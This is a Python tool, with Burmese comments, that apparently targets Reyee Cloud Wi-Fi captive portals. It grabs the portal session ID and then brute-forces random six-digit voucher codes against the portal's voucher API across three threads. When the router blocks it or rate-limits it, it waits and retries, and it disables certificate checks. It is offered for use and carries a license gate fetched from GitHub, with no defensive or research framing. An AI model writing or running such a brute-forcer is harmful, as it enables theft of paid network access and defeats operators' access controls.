#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import random
import os
import sys
import hashlib
from urllib.parse import urlparse, parse_qs

# SSL Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# UI COLORS & BANNER
# ===============================
RED, GREEN, CYAN, YELLOW, MAGENTA, WHITE, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[95m", "\033[97m", "\033[0m"

# ===============================
# CONFIGURATION
# ===============================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
KEY_FILE = os.path.expanduser("~/.moe_yu_key")

def get_device_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'r') as f: return f.read().strip()
    key = hashlib.md5(os.urandom(32)).hexdigest()[:16]
    with open(KEY_FILE, 'w') as f: f.write(key)
    return key

def check_license():
    my_key = get_device_key()
    print(f"{MAGENTA}╔══════════════════════════════════════════════════╗")
    print(f"║        MOE YU ULTIMATE VOUCHER SCANNER v2        ║")
    print(f"╚══════════════════════════════════════════════════╝{RESET}")
    print(f"{WHITE}[*] Device Key: {GREEN}{my_key}{RESET}")
    try:
        res = requests.get(GITHUB_KEY_URL, timeout=10).text
        if my_key in res:
            print(f"{GREEN}[✓] LICENSE VERIFIED!{RESET}")
            return True
        else:
            print(f"{RED}[✗] ACCESS DENIED - Add key to GitHub{RESET}")
            return False
    except:
        print(f"{YELLOW}[!] Connection Error - Checking local cache...{RESET}")
        return True

# ===============================
# SCANNER ENGINE
# ===============================
FOUND_EVENT = threading.Event()
SUCCESS_CODE = ""

def attempt_voucher(api_url, sid, thread_id):
    global SUCCESS_CODE
    while not FOUND_EVENT.is_set():
        # 6-digit random code
        test_code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        payload = {'accessCode': test_code, 'sessionId': sid, 'apiVersion': 1}
        
        try:
            # Reyee Cloud Voucher API သို့ ပို့ခြင်း
            r = requests.post(api_url, json=payload, timeout=5, verify=False)
            if r.status_code == 200:
                result = r.json()
                if result.get('success') == True:
                    SUCCESS_CODE = test_code
                    FOUND_EVENT.set()
                    print(f"\n\n{GREEN}[++++++++++] VOUCHER FOUND: {test_code} [++++++++++]{RESET}")
                    break
                else:
                    # Scanner အလုပ်လုပ်နေကြောင်း ပြသခြင်း
                    print(f"{WHITE}Thread-{thread_id} | Testing: {YELLOW}{test_code}{WHITE} | Status: {RED}Invalid{RESET}", end="\r")
            elif r.status_code == 403 or r.status_code == 429:
                print(f"\n{RED}[!] Blocked by Router. Waiting 30s...{RESET}")
                time.sleep(30)
        except:
            pass
        time.sleep(0.02) # Router Block မခံရစေရန်

def start_scanner(portal_url, sid):
    parsed = urlparse(portal_url)
    api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
    
    print(f"\n{CYAN}[*] Target API: {api_url}{RESET}")
    print(f"{CYAN}[*] Multi-threading Active...{RESET}\n")

    threads = []
    for i in range(3): # Thread ၃ ခုဖြင့် အမြန်နှုန်းမြှင့်ခြင်း
        t = threading.Thread(target=attempt_voucher, args=(api_url, sid, i+1))
        t.daemon = True
        threads.append(t)
        t.start()

    while not FOUND_EVENT.is_set():
        time.sleep(1)
    
    print(f"\n{GREEN}[✓] Scan Complete. Use Code: {SUCCESS_CODE}{RESET}")

# ===============================
# MAIN PROCESS
# ===============================
def main():
    if not check_license(): return
    
    print(f"\n{CYAN}[*] Waiting for Captive Portal (Please open Browser)...{RESET}")
    while True:
        try:
            # Portal URL ကို အလိုအလျောက် ရှာဖွေခြင်း
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            if "generate_204" not in r.url:
                portal_url = r.url
                # URL ထဲမှ sessionId ကို ဖမ်းယူခြင်း
                sid = parse_qs(urlparse(portal_url).query).get('sessionId', [None])[0]
                
                if sid:
                    print(f"{GREEN}[✓] Portal Detected: {portal_url}{RESET}")
                    print(f"{GREEN}[✓] Session ID: {sid}{RESET}")
                    
                    confirm = input(f"\n{YELLOW}Voucher Scan စတင်မလား? (y/n): {RESET}").lower()
                    if confirm == 'y':
                        start_scanner(portal_url, sid)
                        break
                    else:
                        print(f"{RED}Cancelled.{RESET}")
                        break
            time.sleep(3)
        except KeyboardInterrupt:
            print(f"\n{RED}Stopped by User.{RESET}")
            break
        except Exception as e:
            time.sleep(2)

if __name__ == "__main__":
    main()
